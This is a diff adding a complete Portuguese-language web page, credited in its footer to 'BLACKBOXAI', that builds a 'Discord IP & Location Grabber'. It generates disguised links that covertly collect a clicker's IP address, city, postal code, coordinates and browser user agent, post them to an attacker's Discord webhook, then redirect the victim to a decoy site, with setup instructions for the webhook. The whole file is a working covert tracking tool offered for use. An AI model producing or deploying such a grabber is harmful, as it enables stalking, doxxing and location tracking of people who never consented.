@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Discord IP & Location Grabber</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
+    body {
+      margin: 0; 
+      font-family: 'Montserrat', sans-serif;
+      background: linear-gradient(135deg, #4e54c8, #8f94fb);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    h1 {
+      font-weight: 700;
+      font-size: 2.5rem;
+      margin-bottom: 0.2em;
+      text-align: center;
+      text-shadow: 1px 1px 5px #0008;
+    }
+    p.description {
+      max-width: 420px;
+      margin-bottom: 1.5em;
+      text-align: center;
+      font-size: 1rem;
+      opacity: 0.85;
+    }
+    .container {
+      background: rgba(255 255 255 / 0.1);
+      padding: 24px 32px;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgb(0 0 0 / 0.25);
+      width: 100%;
+      max-width: 480px;
+      backdrop-filter: blur(15px);
+      margin-bottom: 2em;
+    }
+    label {
+      display: block;
+      margin-bottom: 0.4em;
+      font-weight: 600;
+      font-size: 0.9rem;
+      color: #cbd5e1;
+    }
+    input[type="text"], input[type="url"] {
+      width: 100%;
+      padding: 10px 14px;
+      border-radius: 8px;
+      border: none;
+      font-size: 1rem;
+      margin-bottom: 1.2em;
+      box-sizing: border-box;
+      outline-offset: 2px;
+      outline-color: #7f8fa6;
+    }
+    input[type="text"]:focus, input[type="url"]:focus {
+      outline-color: #6c5ce7;
+      box-shadow: 0 0 8px #6c5ce7aa;
+    }
+    button {
+      width: 100%;
+      padding: 14px 0;
+      border-radius: 12px;
+      border: none;
+      font-weight: 700;
+      font-size: 1.1rem;
+      background: #6c5ce7;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      box-shadow: 0 5px 15px #6c5ce7cc;
+    }
+    button:hover {
+      background: #4834d4;
+      box-shadow: 0 7px 20px #4834d4dd;
+    }
+    .output {
+      margin-top: 1.5em;
+      background: rgba(0 0 0 / 0.2);
+      padding: 12px 16px;
+      border-radius: 12px;
+      font-family: monospace;
+      word-wrap: break-word;
+      font-size: 0.9rem;
+      max-height: 120px;
+      overflow-y: auto;
+    }
+    .footer {
+      margin-top: 2em;
+      font-size: 0.85rem;
+      color: #aab2bd;
+      text-align: center;
+    }
+    a.footer-link {
+      color: #aab2bd;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    a.footer-link:hover {
+      color: #6c5ce7;
+      text-decoration: underline;
+    }
+    details {
+      background: rgba(0 0 0 / 0.15);
+      padding: 10px 15px;
+      border-radius: 10px;
+      margin-top: 20px;
+      cursor: pointer;
+      color: #d1d5db;
+      font-size: 0.9rem;
+      user-select: none;
+    }
+    details summary {
+      font-weight: 600;
+      outline: none;
+    }
+    details[open] {
+      color: #eef2ff;
+      background: rgba(108, 92, 231, 0.3);
+      box-shadow: 0 8px 30px rgba(108, 92, 231, 0.5);
+    }
+    details p {
+      margin-top: 0.8em;
+      line-height: 1.3;
+      color: #cbd5e1;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Discord IP & Location Grabber</h1>
+  <p class="description">Insira o link de destino e o webhook do canal do Discord para gerar um link grabber. Quando alguém clicar, seu IP e localização serão enviados para o canal via webhook, depois redirecionados.</p>
+
+  <div class="container" id="input-container">
+    <label for="destUrl">URL de destino (ex: https://example.com)</label>
+    <input type="url" id="destUrl" placeholder="https://example.com" autocomplete="off" required />
+    
+    <label for="webhookUrl">Webhook do Discord (URL do canal para receber dados)</label>
+    <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" required />
+
+    <button id="generateBtn">Gerar Link Grabber</button>
+
+    <div class="output" id="output" style="display:none;"></div>
+  </div>
+
+  <details>
+    <summary>Como criar um webhook no seu canal do Discord?</summary>
+    <p>1. Abra o Discord e vá até o canal onde quer receber os dados.</p>
+    <p>2. Clique no nome do canal e selecione "Editar Canal".</p>
+    <p>3. Vá na aba "Integrações".</p>
+    <p>4. Clique em "Webhooks" e depois em "Novo webhook".</p>
+    <p>5. Dê um nome e imagem ao webhook se quiser.</p>
+    <p>6. Copie o URL do webhook (começa com <code>https://discord.com/api/webhooks/...</code>).</p>
+    <p>7. Cole esse URL no campo "Webhook do Discord" acima.</p>
+  </details>
+
+  <script>
+    // Função que retorna query params na URL
+    function getQueryParams() {
+      const params = {};
+      const queryString = window.location.search.substring(1);
+      const pairs = queryString.split("&").filter(Boolean);
+      for (const pair of pairs) {
+        const [key, value] = pair.split("=");
+        params[decodeURIComponent(key)] = decodeURIComponent(value || "");
+      }
+      return params;
+    }
+
+    const inputContainer = document.getElementById("input-container");
+    const outputDiv = document.getElementById("output");
+    const generateBtn = document.getElementById("generateBtn");
+    const destUrlInput = document.getElementById("destUrl");
+    const webhookUrlInput = document.getElementById("webhookUrl");
+
+    // Função para montar o link grabber
+    function generateGrabberLink(dest, webhook) {
+      const baseUrl = window.location.origin + window.location.pathname;
+      const encodedDest = encodeURIComponent(dest);
+      const encodedWebhook = encodeURIComponent(webhook);
+      return `${baseUrl}?dest=${encodedDest}&wh=${encodedWebhook}`;
+    }
+
+    generateBtn.addEventListener("click", () => {
+      const dest = destUrlInput.value.trim();
+      const webhook = webhookUrlInput.value.trim();
+
+      if (!dest || !webhook) {
+        alert("Por favor, preencha ambos os campos.");
+        return;
+      }
+      try {
+        new URL(dest);
+      } catch {
+        alert("URL de destino inválida.");
+        return;
+      }
+      try {
+        new URL(webhook);
+      } catch {
+        alert("Webhook inválido.");
+        return;
+      }
+
+      const grabberLink = generateGrabberLink(dest, webhook);
+      outputDiv.style.display = "block";
+      outputDiv.textContent = grabberLink;
+      outputDiv.scrollIntoView({behavior:"smooth"});
+    });
+
+    // Quando página acessada com parâmetros dest e wh, executa o grabber
+    (async function executeGrabberIfNeeded() {
+      const params = getQueryParams();
+      if (!params.dest || !params.wh) {
+        // Mostrar interface normal para gerar o link
+        return;
+      }
+
+      // Oculta interface e mostra mensagem de carregamento
+      inputContainer.innerHTML = "<p style='font-size:1.25rem; text-align:center; margin-bottom:1em;'>Carregando... Capturando dados e redirecionando.</p>";
+
+      // Pega IP público usando api.ipify.org
+      let ip;
+      try {
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipResponse.json();
+        ip = ipData.ip || "Desconhecido";
+      } catch {
+        ip = "Desconhecido";
+      }
+
+      // Pega dados de localização do IP usando ipapi.co
+      let geo = {};
+      try {
+        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+        geo = await geoResponse.json();
+      } catch {
+        geo = {};
+      }
+
+      // Monta mensagem para o Discord Webhook
+      const webhookUrl = params.wh;
+      const destUrl = params.dest;
+
+      const embed = {
+        title: "⚠️ Novo clique no IP Grabber",
+        color: 0x6c5ce7,
+        fields: [
+          { name: "IP", value: ip, inline: true },
+          { name: "Cidade", value: geo.city || "Desconhecido", inline: true },
+          { name: "Região", value: geo.region || "Desconhecido", inline: true },
+          { name: "País", value: geo.country_name || "Desconhecido", inline: true },
+          { name: "Código Postal", value: geo.postal || "Desconhecido", inline: true },
+          { name: "Fuso Horário", value: geo.timezone || "Desconhecido", inline: true },
+          { name: "Latitude", value: geo.latitude ? geo.latitude.toString() : "Desconhecido", inline: true },
+          { name: "Longitude", value: geo.longitude ? geo.longitude.toString() : "Desconhecido", inline: true },
+          { name: "Agente do Usuário", value: navigator.userAgent || "Desconhecido" },
+          { name: "Página Destino", value: `[Clique aqui](${decodeURIComponent(destUrl)})` }
+        ],
+        timestamp: new Date().toISOString(),
+        footer: {
+          text: "Discord Grabber Bot"
+        }
+      };
+
+      // Envia para o webhook com fetch POST
+      try {
+        await fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ embeds: [embed] }),
+        });
+      } catch (err) {
+        // falha no envio não impede o redirect
+      }
+
+      // Redireciona para o link de destino após 1.5 segundos
+      setTimeout(() => {
+        window.location.href = decodeURIComponent(destUrl);
+      }, 1500);
+    })();
+  </script>
+
+  <div class="footer">
+    Desenvolvido para uso em bots do Discord por BLACKBOXAI
+  </div>
+
+</body>
+</html>
